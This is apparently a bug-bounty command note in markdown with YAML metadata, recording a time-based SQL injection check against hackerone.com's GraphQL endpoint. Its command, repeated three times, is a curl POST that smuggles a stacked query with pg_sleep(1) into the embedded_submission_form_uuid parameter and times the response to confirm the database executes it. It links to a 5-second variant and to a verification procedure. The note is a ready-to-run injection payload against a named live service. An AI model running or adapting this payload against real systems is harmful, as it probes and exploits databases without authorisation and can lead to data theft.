---
data: >-
  time curl -X POST
  https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%281%29%3B--%27
tags:
  - timing-attack
  - verification
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.933Z'
id: 02a62056-5773-4483-8d1c-ca00f5d8831a
verified: false
validated: true
submitted: true
---
# time-curl-1s-sleep

## Command

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%281%29%3B--%27
```

## Description

Measures response time for a 1-second pg_sleep injection to verify SQL execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Times the command execution | Yes |
| `-X POST` | HTTP method | Yes |
| URL and payload | Endpoint and 1s sleep injection | Yes |

## Examples

### Basic Usage

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%281%29%3B--%27
```

## Expected Output

Total time ~1.631s with {} response.

## Related

- [[commands/time-curl-5s-sleep]]
- [[procedures/Verify-Injection-Using-Timing-Attacks-with-pg_sleep]]
